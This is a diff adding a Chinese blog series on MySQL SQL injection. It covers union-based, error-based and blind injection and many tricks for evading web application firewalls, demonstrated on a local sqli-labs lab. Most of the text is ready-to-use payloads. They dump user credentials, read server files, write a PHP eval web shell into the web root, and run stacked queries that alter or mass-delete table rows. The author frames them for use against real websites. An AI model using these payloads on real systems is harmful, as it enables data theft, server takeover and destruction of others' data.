@@ -1,0 +1,264 @@
+sql注入杂谈（一）--union select
+我就简单说说我对于联合注入的想法，以及对于联合注入绕过防火墙的方法，（只是我自己目前所掌握的方法，当然更多奇淫技巧还的需要我们自己去发掘）对于我们才学习安全的人来说，对于练习sql注入，我们学习最简单的语法就是sql注入之联合注入。
+
+就拿sqli-labs来说说吧127.0.0.1/less-1/?id=1
+
+我们的教程里面就说127.0.0.1/less-1/?id=1' 加上单引号，看爆不爆错，如果报错了可能存在sql注入，因为当我们127.0.0.1/less-1/?id=1这样提交时，系统会自动加上单引号，就像这样127.0.0.1/less-1/?id='1',但是由于我们又加了单引号，就形成这样127.0.0.1/less-1/?id='1''，所以就会报错，这说明什么，说明系统把我们的单引号带入系统查询了，所以会存在报错。
+
+然后教程就说第二步，（1）127.0.0.1/less-1/?id=1' order by 2--+    （2）127.0.0.1/less-1/?id=1' order by 3--+      （3）127.0.0.1/less-1/?id=1' order by 4--+我相信大家一定不会陌生,假如有3个字段，那么1和2不会报错，3就会报错，那么我们就可以笃定他有3个字段，所以，我们接下来就可以进行我们的第三步，union select，对了，在此之前，我一直搞不懂为何后面要加注释，后来才明白，我们不加注释，提交的语句为127.0.0.1/less-1/?id='1' order by 3' 这样就会报错，但是加了注释，提交的语句就是这样127.0.0.1/less-1/?id='1' order by 3#',后面的单引号就被注释掉了，就没有问题
+
+然后我们就来到了教程的第三步127.0.0.1/less-1/?id=-1' union select 1,2,user()--+然后运用联合注入查看用户，database()数据库，@@datadir数据库的地址等等，然后我们就可以爆数据库的库名127.0.0.1/less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
+
+127.0.0.1/less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="security"    爆security的表名
+
+127.0.0.1/less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="users"   爆users表的字段名
+
+127.0.0.1/less-1/?id=-1' union select 1,group_concat(username,0x7C,password),3 from users--+   然后读取表的字段内容，
+
+可能有的讲师讲的比较深，要说limit，然后sql注入再讲几个简单的绕waf，就过去了，初学就觉得，流啤的很，TM出数据了，好屌，其实当我们实操的时候，会发现，我们的union select根本就没有用，最后还是靠sqlmap -u xxx --batch --level=3 --risk=3 --hex --tamper="space2randomblank.py" --batch --current-db，如果没有跑出来，然后我们就想到用burpsuit抓包，然后post注入，如果这样还搞不定，那么我们就放弃了（我是这样跌跌撞撞走过来的,哈哈）
+
+今天我就说说我的一些经验吧！虽然也不多，在大牛面前看起来也就那样，但还是分享跟那些才学安全的朋友。
+
+首先我们看一个网站是否存在注入点，别一来就加单引号，因为某些敏感的网站，你加了单引号，你的ip直接被ban了，比如
+
+　　http://127.0.0.1/sql/Less-1/?id=1-1    http://127.0.0.1/sql/Less-1/?id=1 看这2个回显的长度，用burpsuit看length，这是基于数字型的
+
+　　http://127.0.0.1/sql/Less-1/?id=1'-'1   http://127.0.0.1/sql/Less-1/?id=1'-'0     这是基于字符串型的
+
+如果是空数据类型的 http://127.0.0.1/sql/Less-1/?id=1-exp(11111)    这样判断
+
+ 
+
+ 如若大家想用 and 1=1,我建议不要这样，因为现在大部分网站都会拦截，我们可以1%2b1=2  1%2b1>1   这样判断
+
+这些说完了，我就来说说基于union select的绕过方法
+
+1.网上也有很多，大小写绕过，UNIunionON SELselectECT关键字替换绕过，但是对于很多网站，这个已经不怎么实用了。
+
+2.其次是编码以及服务器的解析（包括参数污染）
+
+基于iis+asp的容器:   s%u0065lect->select        s%u00f0lect->select      %U%N%I%O%N      //这3种方法绕过
+
+3.然后是是参数解析错误绕过: http://127.0.0.1/sql/Less-1/?id=1&id=-2' union select 1,user(),3--+
+
+　　　　　　　　　　　　     http://127.0.0.1/sql/Less-1/?id=-1+div+0' union select 1,2,user()--+
+
+4.然后如果某些网站支持二次解析url编码:  /**/ = %2F%2A%2A%2F == %25%32%46%25%32%41%25%32%41%25%32%46
+
+5.然后利用hpp参数污染绕过
+
+　　http://127.0.0.1/sql/Less-1/?id=1 /*&id=-1'union select 1,user(),3 -- +*/       //利用hpp参数污染
+
+　　http://127.0.0.1/sql/Less-1/?id=-1' and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version()--+       //利用垃圾文件绕过
+
+6.接下来就是内联注释绕过
+
+　　union/*!/*!50000select*/       //网上说是版本号，但是我在我的less1里面10000~50000都可行，大家也可以用burpsuit遍历看长度
+
+　　union/*!/**/%0aselect*/     //%0a是换行                +UnIoN/**/SeLecT/**/1,2,user()                        un/**/ion se/**/lect          /**/union/*/select/**/
+
+　　/*!40000 order*/ by 4--+         order /*!40000by*/ 4 --+
+
+7.加入特殊字符
+
+　　union %23%0aall     //%23是注释，%0A是换行，相当于把注释换到下一行          union -- 1%0a select             +union+select+1,user(),3--+
+
+　　union(select 1,2,user())--+             +uni%0bon+se%0blect+1,2,user()--+        
+
+8.系统函数被过滤
+
+　　1.列如我们的user()函数被过滤怎么办
+
+　　user/**/(/**/)     //利用内联注释绕过    还可以user/*!50000*/(/**/)
+
+　　user/*!50000*/%23%0a(/**/)           //利用注释换行绕过
+
+　　`user`%0a()              //利用反引号绕过+换行绕过
+
+　　2.information_schema.schemata被过滤
+
+　　`information_schema`.`schemata `                `information_schema`.schemata                    information_schema.`schemata `                  //反引号3连
+
+　　information_schema/**/.schemata                  information_schema/*!*/.schemata               information_schema/*!50000*/.schemata       //内联注释3连
+
+　　information_schema%0a.schemata               (information_schema.schemata)                   //特殊符号绕过
+
+9.写文件，读文件　　
+
+　　union select 1,load_file('C:/Users/Desktop/c.txt'),3--+     //读文件（当然需要权限），用16进制转字符串
+　　union select 1,2,"<?php @eval($_POST[a]);?>" into outfile "C:/Desktop/b.txt"--+      //写文件
+　　union select 1,2,"<?php @eval($_POST[a]);?>" into dumpfile "D:/3.php"--+      //写文件
+　　针对于写读文件的绕过
+
+　　union select 1,hex(load_file(0x433A2F55736572732F415355532F4465736B746F702F632E747874)),3--+  
+
+　　union select 1,load_file(char(99,58,47,98,101,111,116,76,105,114,105)),3--+   //可以使用hex编码和char编码来绕过，当然前面的union select也可以用前面的方法绕过
+
+10.宽字节注入
+有些时候我们对网站sql注入的时候，会发现加上单引号会被/‘斜杠加单引号套餐伺候，这个时候我们就需要运用宽字节注入，当然你的%df，你的宽字节的ascii码必须要大于128，才能使与/变成一个汉字。
+　　127.0.0.1/less-1/?id=-1%df’ union select 1,2,version()–+这样，如果%df被拦截了
+　　%EF%BF%BD%27union%20select%201,user(),3–+ 可以这样
+
+
+11.其他（比如我们的注释–+无法注释后面的单引号）
+　　union select 1,user(),3 and ‘1’%2b’1’='2 这样绕过，=也可以变为%3D
+　　也可以union select 1,user(),3 and ‘2’ >'1　　>也可以变为%3E
+
+ 
+
+12堆叠查询
+127.0.0.1/less-1/?id=1’;insert into users values (‘8’,‘xinxin’,‘shuai’)–+ //增加一条数据，当然得有权限，这些都是配合POST注入，举个例子（基于lcamry的注入天书）
+比如我们在一个登陆界面，我们当然显得判断出他的闭合是什么，如若是单引号，我们就输入payload
+uname=admin&passwd=c’;insert into users values (‘8’,‘xinxin’,‘shuai’)#&submit=Submit //我们直接加数据进去，当然前提的有权限
+然后就是删;
+delete from guest where id =7 or 1=2–+ 这个的慎用，记住，or后面必须是错误语句，否则表TM全删了。
+;delete from guest where id =7 or 1=1–+ (这个就是以后别人送饭到手了)
+;UPDATE guest SET firstname=‘akak’ WHERE id=3–+ //这个是改
+
+
+sql注入杂谈（二）--报错注入
+其实报错注入是很强的，网上也有很多讲报错注入的，语法都有，但是很少有人讲解报错注入的绕waf，所以今天我小试牛刀，讲讲我自己的见解
+
+我就基于我自己的见解分享一下我自己的报错注入绕过,let's go
+
+我们还是基于less-1来说，首先是第一条语句（extractvalue）
+
+原理我就不阐述了，但是大家还是要对原理了解清楚，不然用的都是别人的东西
+
+第一个：http://127.0.0.1/sql/Less-1/?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))--+
+
+基于waf，它会过滤哪些敏感的东西呢？
+
+可能有单引号，and，extractvalue，database
+
+然后我们一个一个来拆分
+
+（1）and 首先联想到的就是 && &=%26 通过编码绕过，然后就是给编码内联注入绕过/*!&&*/    /*!%26%26*/   /*!50000&&*/   /*!50000%26%26*/
+
+这个是基于and过滤的payload  127.0.0.1/sql/Less-1/?id=-1' /*!50000%26%26*/ extractvalue(1,concat(0x7e,(select database()),0x7e))--+    //举一反三 or and xor也是这样
+
+所有的报错注入and 都可已换为or xor and 随便换   在Ps一下 ：我们熟知的or = ||   当然 or = |
+
+（2）然后就是extractvalue，这个我们可以怎么绕过呢
+
+第一是大小写绕过extRactvAlue，因为不一定所有函数的大小写waf的正则表达式都包括了。
+
+第二是内联注释，内联注释大法好啊，/*!50000%26%26*/ /*!50000extRactvAlue*/(1,concat(0x7e,(select database()),0x7e))--+。
+
+第三是特殊符号绕过，
+
+　　1./*!50000%26%26*/ /*!50000`extRactvAlue`*/(1,concat(0x7e,(select database()),0x7e))--+ 借助反引号我们绕过了
+
+　　2./*!50000%26%26*/!!!/*!50000`extRactvAlue`*/(1,concat(0x7e,(select database()),0x7e))--+ 利用感叹号绕过
+
+　　3.%0bor%0b(extractvalue(1,concat(0x7e,(select database()),0x7e)))--+    利用%0b来绕过
+
+　　4./*!50000%26%26*/!!!/*!50000`extRactvAlue`*/(1,concat(0x7e,(select database()),0x7e))/*!50000*/--+     在后面加上内联注释
+
+（3）然后就是database
+
+　　基于database的绕过请参照我的第一篇文章
+
+（4）利用hpp参数污染绕过
+
+　　/*&id='and (extractvalue(1,concat(0x7e,(select user()),0x7e)))--+*/                //然后我们可以在参数污染里面动手脚，大家都懂吧
+
+ 
+
+当然这样以后，我们还是没有绕过，那是很正常的，哈哈哈哈，然后接下来就需要运用整体法
+
+（1）首先是运用procedure analyse解析法
+
+　　procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)--+     //rand()是生成一个0~1的随机数，对于rand函数如果有印象的朋友肯定会联想到floor报错，当然，我们也可以在pro的基础上加上我们刚刚的方法
+
+　　procedure%23%0aanalyse(/*!50000`extractvalue`*/(rand(),`concat`(0x3a,database/**/(/*!50000*/))),1)/*!11340*/--+  这样绕过，运用组合拳
+
+　　ps一下:当我们查表的时候，from information_schema.tables where table_schema='security'   我们可以把security变为hex编码，因为某些waf对自己的数据库表名很敏感。对了extractvalue和updatexml查询都有长度限制，当我们查询密码的时候，都是md5的值，那么我们查询最多就是31位，还有一位不知道，那个咋整，我们就需用运用md5法来查看，我们就拿updatexml来说吧
+
+and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),17,32),0x7e),1)--+     17和32是取的长度
+
+（2）换函数，我们报错注入除了extractvalue，还有其他的函数，绕过的方法有很多，我们要灵活多变
+
+ 
+
+第二个：and(select 1 from(select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+  我们可以运用floor报错来注入，绕过的方法参照extractvalue，我这里就总结有哪些报错函数了
+
+第三个:and (updatexml(1,concat(0x7e,(select database()),0x7e),1))--+
+
+第四个：and geometrycollection((select * from(select * from(select database())a)b))--+    //后面的456789都是一样的，只是函数名变了
+
+第五个：and multipoint((select * from(select * from(select database())a)b))--+
+
+第六个：and polygon((select * from(select * from(select database())a)b))--+
+
+第七个：and multipolygon((select * from(select * from(select database())a)b))--+
+
+第八个：and linestring((select * from(select * from(select database())a)b))--+
+
+第九个：and multilinestring((select * from(select * from(select database())a)b))--+
+
+ps:这几个函数我没有说绕过的payload，是因为仔细看完我写的extractvalue绕过，都是通用于其他报错函数的，因为换汤不换药，重要的是变通，看waf是过滤哪些方法与哪些函数，这些才是我们绕waf的精髓
+
+第十个：and exp(~(select * from(select database())a))--+      //利用exp报错，前面联合检测注入点，1-exp(11111)判断注入点就是基于这个原理
+
+　　　　and!!!`exp`(~(select * from(select database())a))--+    // exp可以用反引号
+
+第十一个：union select (!(select * from (select database())x) - ~0),2,3--+      //利用bigint报错，union select可以绕过
+
+第十二个：or 1 group by concat_ws(0x7e,database(),floor(rand(0)*2)) having min(0) or 1--+        floor的变形
+
+当然，我的总结只是片面的，如果大家还想变得更强，可以多看点文章，专研mysql的手册，学无止境
+
+sql注入杂谈（三）--盲注
+现在我来谈谈我对于盲注的看法，网上把盲注的种类分了几种，我在这里就不分了，我就把我自己目前掌握的方法都记录下来，绕狗的一些心得。顺带一提，其实我的盲注其实是很菜的，但是盲注确是很厉害的，因为能union select注入和报错注入的网站，肯定能盲注，但是盲注的网站不一定能用union select以及报错注入拿下，意思就是掌握盲注其实能日的站要广一些。
+
+首先讲讲盲注一些基础的东西，其实我们才学sql注入有的讲师将盲注，就会讲一些很基本的函数，比如left ,length，substr等，盲注函数三剑客。但是只掌握这3个函数，对于我们盲注来说，只能玩玩sqli-labs，其实盲注配合burpsuit基于fuzz看长度来做，为提高很高的效率，不说p话了。
+
+and length(database())=8%23--+     //我们用这个来看看网站当前数据库的长度。如果有waf，一套组合拳
+
+127.0.0.1/sql/Less-1/?id=1' %0b/*!%26%26*/%0b!!!%23%0aleNGth(database/**/(/**/))=8%23--+      //看数据库的长度
+
+然后同样的left函数我们也可以这样绕过
+
+接下来我就讲讲substr这个函数，以及怎么样绕过
+
+and substr((select database()),3,1)='c' --+     //遍历3得到数据库的名字，security
+and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>109--+      //得到表   红色的为第一个表的第二字字母，紫色的为第几个表
+and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 0,1)--+    //查看users表里的字段，password也可以换成username
+and ORD(MID((SELECT IFNULL(CAST(password AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+     //爆破user表里的password的字段，红色的为Dumb，紫色的为i-kill-you
+关于绕狗的几点建议
+1.我们首先也可以大小写绕过 suBStr这样
+
+2.函数替代，其实我们的sunstr = substring
+
+3.利用内联注释
+
+4.反引号
+
+5.特殊符号
+
+6.增加函数
+
+　　and IFNULL((substr((select database()),1,1)='s'),0) --+     //增加一个infull函数
+
+　　and strcmp((substr((select database()),3,1)='c'),1)--+      //增加一个strcmp函数
+
+　　and 0=strcmp((substr((select user()),2,1)='o'),0)--+     //这是对于strcmp函数的变形
+
+接下来看绕狗的payload:%0b/*!%26%26*/%0b!!!%23%0a ascii(sUbstRIng((select table_name from (`information_schema`./**/tables) where table_schema=database/**/(/**/) limit 0,1),2,1))>103--+
+
+然后是case when来绕过
+
+and case when (substr((select user()),1,1)="r") then sleep(3) else 1 end--+    //用when case绕过
+
+%0b/*!50000|*/%0b!!!/*!case*/%23--hex()%0awhen (sUbsTrinG((select user/**/(/**/)),1,1)="r") then sleep(3) else 1 end/*!13440*/--+    //这里就不截图了，但是回显的时间正确的明显比错误的常
+
+ 
+
+利用if来绕过
+
+　　and If(ascii(length(database()))=56,1,sleep(5))--+      //绕过的payload如上面所演示
+
+　　基于这一类，我们可以结合burpsuit，就不用等回显，我们直接看长度
+
+因为我的盲注也很弱，所以基于绕过盲注的方法也只有这么一点，但是我还是希望这几篇文章能够帮到一些刚刚学习sql注入的朋友，文章如有错误，还请各位看官斧正。
